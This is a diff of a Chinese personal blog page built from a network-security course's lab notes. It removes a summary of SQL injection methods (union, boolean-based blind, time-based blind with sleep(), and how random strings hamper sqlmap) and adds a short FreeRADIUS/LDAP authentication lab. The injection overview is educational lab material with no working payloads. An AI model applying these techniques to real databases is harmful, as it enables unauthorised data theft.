-<li><a href="https://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html" target="_blank" rel="noopener">https://wps2015.org/drops/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</a></li>
-</ol>
-<h3 id="实验总结与心得"><a href="#实验总结与心得" class="headerlink" title="实验总结与心得"></a>实验总结与心得</h3><ul>
-<li>对于注入，总的来说有3种主要方式：联合查询、布尔盲注、时间盲注。这三种方式各有各自特点。我通过手工注入从获取数据库名到爆库，直到最后还可以进一步联合查询sys数据库中的敏感信息（这些也是可以做的）。<ul>
-<li>联合查询：适用于有返回结果的注入方式，查询速度较快。</li>
-<li>boolean-based方式：适用于返回值只有true or false的情况，我们可以用二分法不断地判断正误，从而一个字母一个字母地找出数据库名、表名、列名。</li>
-<li>time-based方式：适用于不管有没有返回结果均返回固定值的方式，主要是用到了注入中的<code>sleep()</code>函数，这样更慢但同时也更隐蔽。</li>
-<li>一般注入方式的选择是：先Union，再boolean-based，最后time-based。</li>
-</ul>
-</li>
-<li>至于随机字符串，它们对于手工注入丝毫没有影响，主要是影响sqlmap，因为每次地返回结果是动态的就会导致sqlmap工作异常，这是一种很好的屏蔽机制。</li>
-</ul>
+<p><img src="/网络安全实验/网络对抗原理实验二/r.png" alt="coin"></p>
+<p>这里，apache2使用freeradius进行认证，并且radius和ldap连接，我们使用student.ldif中学生信息就可完成radtest认证。</p>
+<p><img src="/网络安全实验/网络对抗原理实验二/09157948-F2BB-49B1-94C0-71C5AB30DE0F.png" alt="coin"></p>
+<p>至此实验二大功告成！</p>
 
           
         
@@ -916,7 +717,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -964,7 +765,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -975,7 +776,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -986,7 +787,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1086,7 +887,7 @@
     
       <span class="post-meta-item-text">全站字数&#58;</span>
     
-    <span title="全站字数">13.7k</span>
+    <span title="全站字数">14.2k</span>
   
 </div>
 
